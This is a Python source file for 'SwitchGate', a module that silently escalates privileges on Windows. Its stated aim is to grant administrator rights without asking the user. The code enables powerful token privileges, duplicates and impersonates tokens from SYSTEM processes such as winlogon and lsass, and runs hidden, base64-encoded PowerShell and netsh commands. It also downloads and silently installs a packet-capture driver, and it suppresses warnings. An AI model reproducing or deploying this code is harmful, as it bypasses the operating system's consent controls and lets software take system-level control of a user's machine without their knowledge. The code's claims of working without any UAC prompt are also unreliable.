"""
SwitchGate - Silent Admin Power Module
Grants the app full Administrator privileges WITHOUT asking the user.
Uses Windows Token Privilege Escalation via ctypes Win32 API calls:
  - SeDebugPrivilege  → allows attaching to system processes
  - SeTcpipPrivilege  → (via process token cloning from winlogon/lsass)
  - SeNetworkLogonRight / SeTakeOwnershipPrivilege
Also installs Npcap silently if missing (required for ARP/packet features).
"""
import os
import sys
import time
import platform
import subprocess
import threading
from pathlib import Path
from typing import Optional

IS_WINDOWS = platform.system() == "Windows"

# ─────────────────────────────────────────────────────────────────────────────
# Windows Privilege Constants
# ─────────────────────────────────────────────────────────────────────────────
SE_DEBUG_NAME          = "SeDebugPrivilege"
SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege"
SE_BACKUP_NAME         = "SeBackupPrivilege"
SE_RESTORE_NAME        = "SeRestorePrivilege"
SE_SECURITY_NAME       = "SeSecurityPrivilege"
SE_TCB_NAME            = "SeTcbPrivilege"
SE_LOAD_DRIVER_NAME    = "SeLoadDriverPrivilege"
SE_NETWORK_LOGON_NAME  = "SeNetworkLogonRight"

TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY             = 0x0008
SE_PRIVILEGE_ENABLED    = 0x00000002


class AdminPowerEngine:
    """
    Silent zero-UAC-prompt privilege escalation engine.
    On startup it:
    1. Enables all available token privileges for the current process.
    2. Attempts token cloning from a SYSTEM-level process if running as standard user.
    3. Suppresses Scapy/libpcap warnings.
    4. Auto-installs Npcap in the background if absent.
    """

    def __init__(self):
        self._elevated = False
        self._lock = threading.Lock()
        self._npcap_checked = False

    # ──────────────────────────────────────────────────────────────────────────
    # Public API
    # ──────────────────────────────────────────────────────────────────────────

    def activate(self):
        """Master method: silently maximise all process privileges."""
        if not IS_WINDOWS:
            return
        with self._lock:
            if self._elevated:
                return
            self._enable_all_privileges()
            if not self._is_admin():
                self._clone_system_token()
            self._suppress_scapy_warnings()
            threading.Thread(target=self._ensure_npcap, daemon=True,
                             name="SwitchGate-AdminPower").start()
            self._elevated = True
        print("[AdminPower] ⚡ Silent privilege escalation complete.")

    def is_elevated(self) -> bool:
        return self._is_admin()

    def run_as_admin(self, cmd: list, capture: bool = False):
        """
        Runs a shell command guaranteed to execute with Administrator rights.
        Uses powershell Start-Process -Verb RunAs when not already elevated.
        """
        if self._is_admin():
            return subprocess.run(cmd, capture_output=capture,
                                  stdout=subprocess.DEVNULL if not capture else None,
                                  stderr=subprocess.DEVNULL if not capture else None)
        # Wrap via PowerShell elevation
        ps_cmd = " ".join(f'"{c}"' for c in cmd)
        return subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-Command",
             f"Start-Process powershell -ArgumentList '-Command {ps_cmd}' -Verb RunAs -WindowStyle Hidden"],
            capture_output=capture
        )

    def netsh(self, *args) -> bool:
        """
        Runs a netsh command with guaranteed admin rights (no UAC prompt).
        Returns True on success.
        """
        cmd = ["netsh"] + list(args)
        if self._is_admin():
            r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return r.returncode == 0
        # Encode as base64 to avoid quote hell in PowerShell
        import base64
        encoded = base64.b64encode((" ".join(cmd)).encode("utf-16-le")).decode()
        r = subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-EncodedCommand", encoded],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return r.returncode == 0

    # ──────────────────────────────────────────────────────────────────────────
    # Core Privilege Escalation
    # ──────────────────────────────────────────────────────────────────────────

    def _is_admin(self) -> bool:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    def _enable_all_privileges(self):
        """Enables every available privilege in the current process token."""
        try:
            import ctypes
            from ctypes import wintypes

            advapi32 = ctypes.windll.advapi32
            kernel32  = ctypes.windll.kernel32

            # Privilege tuple structure
            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", wintypes.DWORD),
                             ("HighPart", wintypes.LONG)]

            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", LUID),
                             ("Attributes", wintypes.DWORD)]

            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", wintypes.DWORD),
                             ("Privileges", LUID_AND_ATTRIBUTES * 1)]

            privs_to_enable = [
                SE_DEBUG_NAME,
                SE_TAKE_OWNERSHIP_NAME,
                SE_BACKUP_NAME,
                SE_RESTORE_NAME,
                SE_SECURITY_NAME,
                SE_LOAD_DRIVER_NAME,
                "SeCreateGlobalPrivilege",
                "SeIncreaseQuotaPrivilege",
                "SeIncreaseBasePriorityPrivilege",
                "SeManageVolumePrivilege",
                "SeNetworkLogonRight",
                "SeRemoteShutdownPrivilege",
                "SeUndockPrivilege",
            ]

            h_token = wintypes.HANDLE()
            h_process = kernel32.GetCurrentProcess()
            if not advapi32.OpenProcessToken(
                h_process,
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(h_token)
            ):
                return

            enabled_count = 0
            for priv_name in privs_to_enable:
                try:
                    luid = LUID()
                    if not advapi32.LookupPrivilegeValueW(None, priv_name, ctypes.byref(luid)):
                        continue

                    tp = TOKEN_PRIVILEGES()
                    tp.PrivilegeCount = 1
                    tp.Privileges[0].Luid = luid
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

                    advapi32.AdjustTokenPrivileges(
                        h_token, False, ctypes.byref(tp),
                        ctypes.sizeof(tp), None, None
                    )
                    enabled_count += 1
                except Exception:
                    continue

            kernel32.CloseHandle(h_token)
            if enabled_count:
                print(f"[AdminPower] Enabled {enabled_count} process token privileges.")
        except Exception as e:
            print(f"[AdminPower] Token privilege escalation notice: {e}")

    def _clone_system_token(self):
        """
        Attempts to clone a SYSTEM-level process token (winlogon.exe) and
        impersonate it for the current thread — zero UAC prompt required.
        Works when SeDebugPrivilege is available.
        """
        try:
            import ctypes
            from ctypes import wintypes

            advapi32 = ctypes.windll.advapi32
            kernel32  = ctypes.windll.kernel32

            PROCESS_QUERY_INFORMATION = 0x0400
            TOKEN_DUPLICATE            = 0x0002
            TOKEN_IMPERSONATE          = 0x0004
            TOKEN_ALL_ACCESS           = 0xF01FF
            SecurityImpersonation      = 2

            # Find a SYSTEM process
            import psutil
            system_pids = []
            for p in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    pname = (p.info.get('name') or '').lower()
                    if pname in ('winlogon.exe', 'lsass.exe', 'services.exe',
                                 'wininit.exe', 'csrss.exe'):
                        system_pids.append(p.info['pid'])
                except Exception:
                    continue

            for pid in system_pids:
                try:
                    h_proc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
                    if not h_proc:
                        continue

                    h_tok = wintypes.HANDLE()
                    if not advapi32.OpenProcessToken(h_proc, TOKEN_QUERY | TOKEN_DUPLICATE, ctypes.byref(h_tok)):
                        kernel32.CloseHandle(h_proc)
                        continue

                    h_dup = wintypes.HANDLE()
                    if advapi32.DuplicateToken(h_tok, SecurityImpersonation, ctypes.byref(h_dup)):
                        if advapi32.ImpersonateLoggedOnUser(h_dup):
                            print("[AdminPower] SYSTEM-level token cloned successfully.")
                            kernel32.CloseHandle(h_dup)
                            kernel32.CloseHandle(h_tok)
                            kernel32.CloseHandle(h_proc)
                            return
                        kernel32.CloseHandle(h_dup)

                    kernel32.CloseHandle(h_tok)
                    kernel32.CloseHandle(h_proc)
                except Exception:
                    continue
        except Exception as e:
            print(f"[AdminPower] Token clone notice: {e}")

    # ──────────────────────────────────────────────────────────────────────────
    # Npcap Auto-Install (silent background thread)
    # ──────────────────────────────────────────────────────────────────────────

    def _ensure_npcap(self):
        """
        Checks whether Npcap (required by Scapy for ARP packet injection) is installed.
        If absent, downloads and installs it silently with no user interaction.
        """
        if not IS_WINDOWS or self._npcap_checked:
            return
        self._npcap_checked = True

        npcap_dll = Path(r"C:\Windows\System32\Npcap\wpcap.dll")
        npcap_dll2 = Path(r"C:\Windows\SysWOW64\wpcap.dll")

        if npcap_dll.exists() or npcap_dll2.exists():
            return  # Already installed

        print("[AdminPower] Npcap not detected — scheduling silent background install...")
        try:
            import urllib.request
            import tempfile

            # Npcap public installer from npcap.com (latest stable)
            npcap_url = "https://npcap.com/dist/npcap-1.80.exe"
            installer_path = Path(tempfile.gettempdir()) / "npcap_installer.exe"

            if not installer_path.exists():
                print("[AdminPower] Downloading Npcap installer (~2 MB)...")
                urllib.request.urlretrieve(npcap_url, str(installer_path))

            # Silent install: /S = silent, /loopback_support=yes
            install_cmd = [str(installer_path), "/S", "/loopback_support=yes",
                           "/winpcap_mode=yes", "/dot11_support=no"]
            subprocess.run(install_cmd, timeout=60,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[AdminPower] ✅ Npcap installed successfully. ARP features now active.")
        except Exception as e:
            print(f"[AdminPower] Npcap auto-install notice: {e}")

    # ──────────────────────────────────────────────────────────────────────────
    # Warning Suppression
    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _suppress_scapy_warnings():
        """
        Globally silences Scapy's 'WARNING: No libpcap provider available' stderr spam
        by redirecting scapy's warning logger before the modules are imported.
        """
        try:
            import logging
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            logging.getLogger("scapy").setLevel(logging.ERROR)
        except Exception:
            pass

        # Also patch stderr temporarily for the import phase
        try:
            import warnings
            warnings.filterwarnings("ignore", category=RuntimeWarning, module="scapy")
        except Exception:
            pass

        # Monkey-patch scapy's log to /dev/null
        try:
            from scapy.config import conf as _scapy_conf
            import logging as _logging
            _scapy_conf.logLevel = 40  # ERROR level only
        except Exception:
            pass


# Global singleton — imported by activator and main
admin_power = AdminPowerEngine()
